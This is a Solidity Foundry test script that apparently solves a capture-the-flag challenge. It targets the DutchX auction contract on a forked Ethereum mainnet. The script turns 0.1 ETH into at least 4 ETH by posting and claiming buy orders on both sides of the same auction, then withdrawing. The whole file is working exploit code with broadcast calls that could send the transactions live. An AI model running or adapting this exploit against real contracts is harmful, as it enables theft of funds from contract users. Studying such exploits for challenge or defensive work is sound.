// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "../../src/Interfaces.sol";
import "./Interfaces.sol";
import "./Constants.sol";

contract FallingDutchman is Test {
    address user = vm.envAddress("USER_ADDRESS");
    IDutchX dx = IDutchX(DUTCHX);

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);
        vm.deal(user, 0.1 ether);
    }

    function test_Solution() public {
        vm.startBroadcast(user);
        // setup
        IWETH(WETH).deposit{value: 0.1 ether}(); // wrap all
        IERC20(WETH).approve(DUTCHX, 0.1 ether);
        dx.deposit(WETH, 0.1 ether);

        // loop
        uint idx = dx.getAuctionIndex(WETH, KNC);
        console.log(idx);

        // buy up all KNC and claim
        dx.postBuyOrder(KNC, WETH, idx, 0.1 ether);
        dx.claimBuyerFunds(KNC, WETH, user, idx);

        // buy up all WETH and claim
        uint knc = dx.balances(KNC, user);
        console.log(knc / 1e18);
        dx.postBuyOrder(WETH, KNC, idx, knc);
        dx.claimBuyerFunds(WETH, KNC, user, idx);

        // withdraw
        uint weth = dx.balances(WETH, user);
        console.log(weth / 1e18, weth % 1e18);
        dx.withdraw(WETH, dx.balances(WETH, user));
        //unwrap
        IWETH(WETH).withdraw(IERC20(WETH).balanceOf(user));

        vm.stopBroadcast();
        checkSolve();
    }

    function checkSolve() public view {
        require(user.balance >= 4 ether, "not enough ETH");
        console.log("Solved. Ending balance in ETH: %18e", user.balance);
    }
}
